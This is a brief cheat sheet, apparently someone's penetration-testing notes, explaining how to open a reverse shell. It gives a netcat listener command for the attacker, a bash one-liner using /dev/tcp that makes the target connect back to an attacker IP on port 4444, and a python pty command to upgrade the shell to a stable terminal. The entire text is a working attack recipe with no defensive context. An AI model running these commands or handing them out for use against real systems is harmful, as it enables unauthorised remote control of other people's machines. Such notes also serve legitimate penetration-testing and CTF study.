# To open reverse shell:
on the attack machine run:
```
nc -lvnp 4444
```
this will open a socket listening on port 4444, and then on the target machine run:
```
bash -i >& /dev/tcp/<ip>/4444 0>&1
```
This will connect to the port 4444 on the attack machine ip.
The connection can be unstable, so run the command to start a stable terminal:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
